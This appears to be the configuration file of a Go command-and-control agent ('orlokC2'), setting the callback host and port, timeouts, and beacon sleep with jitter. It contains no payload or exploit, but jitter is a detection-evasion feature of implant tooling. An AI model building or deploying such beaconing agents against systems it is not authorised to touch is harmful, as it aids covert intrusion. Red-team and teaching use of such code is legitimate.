package config

import (
	"fmt"
	"math/rand"
	"time"

	"orlokC2_final/internal/types"
)

// AgentConfig holds all configuration parameters for the agent
type AgentConfig struct {
	// Server connection details
	TargetHost string
	TargetPort int
	Protocol   types.ProtocolType

	// Connection behavior
	ConnectionTimeout time.Duration
	RequestTimeout    time.Duration
	ReconnectDelay    time.Duration

	// Operational behavior
	Sleep  time.Duration
	Jitter float64 // As a percentage (0-100)

	// Identity
	AgentUUID string
}

// DefaultConfig returns a configuration with sensible default values
func DefaultConfig() *AgentConfig {
	return &AgentConfig{
		// Default to localhost for testing
		TargetHost: "localhost",
		TargetPort: 7777, // Default to HTTP/1.1 port from the server
		Protocol:   types.H1C,

		// Connection timeouts
		ConnectionTimeout: 2 * time.Minute,  // 2 minutes to establish connection
		RequestTimeout:    1 * time.Minute,  // 1 minute for request completion
		ReconnectDelay:    10 * time.Minute, // 10 minutes before attempting reconnection

		// Operational behavior
		Sleep:  30 * time.Second, // Check in every minute by default
		Jitter: 20.0,             // 20% jitter - vary sleep time by up to 20%

		// Identity - this will be overridden by the build process
		AgentUUID: "00000000-0000-0000-0000-000000000000",
	}
}

// CalculateSleepWithJitter returns the sleep duration with jitter applied
func (c *AgentConfig) CalculateSleepWithJitter() time.Duration {
	// Apply jitter as a percentage of the base sleep time
	jitterFactor := 1.0 + (rand.Float64() * c.Jitter / 100.0)
	return time.Duration(float64(c.Sleep) * jitterFactor)
}

// GetTargetAddress returns the full address (host:port) for the target
func (c *AgentConfig) GetTargetAddress() string {
	return fmt.Sprintf("%s:%d", c.TargetHost, c.TargetPort)
}
